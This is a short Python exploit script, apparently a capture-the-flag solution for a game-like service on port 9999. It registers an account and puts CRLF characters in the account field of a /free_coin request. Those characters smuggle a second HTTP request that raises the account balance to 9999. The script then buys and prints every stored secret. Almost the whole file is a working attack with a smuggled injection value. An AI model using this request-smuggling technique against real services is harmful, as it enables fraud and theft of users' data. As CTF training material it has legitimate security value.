import requests
import json
import sys
import time

import requests

"""
    Rationale: read in writeup, please. It's not that simple!
"""

ip = sys.argv[1] if len(sys.argv) > 1 else "localhost"
url = f"http://{ip}:9999"


def enrich(root_url, account_name):
    desired_gold = 9999

    requests.post(f"{root_url}/register", {
        "account": account_name
    })

    requests.post(f"{root_url}/free_coin", {
        "account": f"\r\n\r\nPOST /api/account/change?account={account_name}&change={desired_gold} HTTP/1.1\r\nHost: {root_url}"
    })

    print(requests.get(f"{root_url}/balance?account={account_name}").text)


account = "richb1tch13"

enrich(root_url=url, account_name=account)

latest = json.loads(requests.get(url + "/placed_secrets").text)["result"]["data"]

for each in latest:
    result = requests.post(url + "/buy_secret", {"account": account, "secret_id": each["id"]}).text
    print(json.loads(result)["result"]["secret"])


